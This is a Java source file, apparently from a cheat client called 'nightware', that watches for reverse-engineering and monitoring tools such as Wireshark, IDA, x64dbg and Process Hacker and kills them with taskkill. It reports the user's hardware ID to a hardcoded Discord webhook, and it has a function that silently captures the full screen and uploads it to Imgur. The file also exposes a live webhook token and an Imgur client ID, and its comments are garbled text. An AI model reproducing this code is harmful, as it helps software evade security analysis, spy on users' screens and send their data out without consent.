package nightware.main;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class ProcessChecker {
    public static String[] processesToClose = {"ProcessHacker.exe"
    , "tcpview.exe"
    , "autoruns.exe"
    , "autorunsc.exe"
    , "filemon.exe"
    , "procmon.exe"
    , "regmon.exe"
    , "procexp.exe"
    , "idaq.exe"
    , "ida.exe"
    , "idaq64.exe"
    , "ImmunityDebugger.exe"
    , "Wireshark.exe"
    , "dumpcap.exe"
    , "HookExplorer.exe"
    , "ImportREC.exe"
    , "PETools.exe"
    , "LordPE.exe"
    , "dumpcap.exe"
    , "SysInspector.exe"
    , "proc_analyzer.exe"
    , "sysAnalyzer.exe"
    , "sniff_hit.exe"
    , "windbg.exe"
    , "joeboxcontrol.exe"
    , "joeboxserver.exe"
    , "x32dbg.exe"
    , "x64dbg.exe"
    , "x96dbg.exe"
    , "ida64.exe"
    , "httpdebugger.exe"
    , "cheatengine-x86_64.exe"
    , "cheatengine-x86_64-SSE4-AVX2.exe"
    , "cheatengine-i386.exe"
    };

    public static void checkProcess() {
        for (String process : processesToClose) {
            if (isProcessRunning(process)) {
                killProcess(process);
                sendWebhook("� ����� � HWID: " + AvtorizaciyaHAHA.hwid + " ��� ������ ������� ��������� ��� Debugger (" + process + ")");
            }
        }
    }

    public static String uploadScreenshot() {
        try {
        // �������� ��������� ������
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        Rectangle screenRectangle = new Rectangle(screenSize);
        BufferedImage screenImage = new Robot().createScreenCapture(screenRectangle);

        // �������� ���������� ����� �����������
        // (����� �������� �� ����� ������ ������ ���������� BufferedImage � ����)
        // File tempFile = File.createTempFile("screenshot", ".png");
        // ImageIO.write(screenImage, "png", tempFile);

        // �������������� BufferedImage � ������ ������
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ImageIO.write(screenImage, "png", baos);
        byte[] screenshotBytes = baos.toByteArray();

        // �������� ��������� �� �������� ���������� (Imgur)
        URL url = new URL("https://api.imgur.com/3/image");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.addRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
        connection.setDoOutput(true);
        connection.setRequestProperty("Authorization", "d45237079d71609"); // �������� YOUR_CLIENT_ID �� ��� Client ID �� Imgur
        connection.setRequestMethod("POST");
        connection.connect();

        DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
        outputStream.write(screenshotBytes);
        outputStream.flush();
        outputStream.close();

        // ��������� ������ � �������
        InputStream responseInputStream = connection.getInputStream();
        StringBuilder responseBuilder = new StringBuilder();
        byte[] buffer = new byte[1024];

        int bytesRead;
        while ((bytesRead = responseInputStream.read(buffer)) != -1) {
            responseBuilder.append(new String(buffer, 0, bytesRead));
        }

        // ��������� ������ � ��������� ������ �� ��������
        String response = responseBuilder.toString();
        int start = response.indexOf("\"link\":\"") + 8;
        int end = response.indexOf("\"", start);

        return response.substring(start, end);
    } catch (AWTException e)  {
            e.printStackTrace();
            return null;
        } catch (ProtocolException e) {
            throw new RuntimeException(e);
        } catch (MalformedURLException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

    }



    private static boolean isProcessRunning(String processName) {
        try {
            Process process = Runtime.getRuntime().exec("tasklist.exe");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.contains(processName)) {
                    return true;
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return false;
    }


    private static void killProcess (String processName) {
        try {
            Runtime.getRuntime().exec("taskkill /F /IM " + processName);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    public static void sendWebhook(String message) {
        try {
            // ������� URL-������ � URL-������� �������
            URL url = new URL("https://discord.com/api/webhooks/1164047412868943953/qLnhB8ypuGTV6UM_CUzFytFJyxPGBjdysOrbE0CbcdNGaLpiMHRurfH4UxxwBDWsRvy7");

            // ��������� ���������� HttpURLConnection
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setDoOutput(true);

            // ������� JSON-������ � ��������� ���������
            String jsonContent = "{\"content\":\"" + message + "\"}";

            // �������� ����� ������
            OutputStream outputStream = connection.getOutputStream();
            outputStream.write(jsonContent.getBytes(StandardCharsets.UTF_8));
            outputStream.flush();
            outputStream.close();

            // �������� �����
            int responseCode = connection.getResponseCode();
            System.out.println("Response Code: " + responseCode);

            // ��������� ����������
            connection.disconnect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }



}